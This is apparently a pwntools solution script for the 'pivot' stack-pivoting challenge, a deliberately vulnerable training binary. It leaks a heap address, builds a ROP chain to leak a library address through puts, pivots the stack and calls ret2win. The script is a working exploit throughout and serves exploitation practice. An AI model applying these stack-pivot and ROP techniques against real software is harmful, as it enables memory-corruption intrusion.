#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pivot')
libcpivot = ELF("./libpivot.so")

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *pwnme+182
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io
    global libcpivot

    io = start()


def pivot():
    offset = 40
    pop_rdi = 0x0000000000400a33 # pop rdi; ret;
    pop_rax = 0x00000000004009bb # pop rax; ret; 
    xchg_rsp_rax = 0x00000000004009bd # xchg rsp, rax; ret;

    io.recvuntil("pivot: ")
    heap_leak = int(io.recvline().decode(), 16)
    info("Leaked address: %#x", heap_leak)
    
    payload = flat(
        exe.plt['foothold_function'],
        pop_rdi,
        exe.got['foothold_function'],
        exe.plt['puts'],
        exe.sym['main']
    )

    io.sendafter(b'>', payload)

    pivot = flat({
        offset: [
            pop_rax,
            heap_leak,
            xchg_rsp_rax
        ]
    })

    io.sendafter(b'>', pivot)
    io.recvuntil('libpivot')
    leak = unpack(io.recv(7)[1:].ljust(8, b'\x00'))
    libcpivot.address = leak - libcpivot.sym['foothold_function']
    info("Libc pivot base address: %#x", libcpivot.address)

    payload = flat({
        offset: [
            libcpivot.sym['ret2win']
        ]
    })

    io.sendline('pwned')
    io.sendafter(b'>', payload)

    io.interactive()

def main():
    
    init()
    pivot()

if __name__ == '__main__':
    main()